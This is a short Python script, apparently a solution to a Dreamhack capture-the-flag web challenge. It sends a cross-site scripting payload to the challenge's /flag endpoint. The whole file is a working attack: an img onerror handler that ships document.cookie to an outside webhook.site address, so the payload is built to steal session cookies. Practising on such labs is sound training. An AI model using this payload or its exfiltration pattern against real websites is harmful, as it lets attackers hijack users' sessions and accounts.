import re
import requests

host = "http://host3.dreamhack.games:11438"
webhook = "https://82cd4b5a-4154-491f-85f4-fb680022b12d.webhook.site"

def solve():
    payload = {
        "param": f"<img src=x onerror=this.src='{webhook}/?c='+document.cookie>"
    }
    print(f"[*] payload: {payload}")
    res = requests.post(host + "/flag", data=payload)
    return res.text
print(solve())